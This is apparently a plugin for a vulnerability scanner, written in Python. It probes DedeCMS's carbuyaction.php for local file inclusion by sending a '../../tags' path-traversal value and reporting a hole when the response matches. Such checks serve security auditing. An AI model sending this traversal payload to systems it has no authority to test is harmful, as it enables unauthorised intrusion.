#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Ario'
#SSV-ID: 60716

import re

def assign(service, arg):
    if service == "dedecms":
        return True, arg
def audit(arg):
    url = arg
    poc="/plus/carbuyaction.php?dopost=return&code=../../tags"
    code, head, body, _, _ = curl.curl("-b code=alipay %s"%(url+poc))
    if code == 200:
        m = re.search('document', body)
        if m:
            security_hole("local file inclusion")
if __name__ == '__main__':
    from dummy import *
    audit(assign('dedecms', 'http://localhost/dedecms/5.6final/')[1])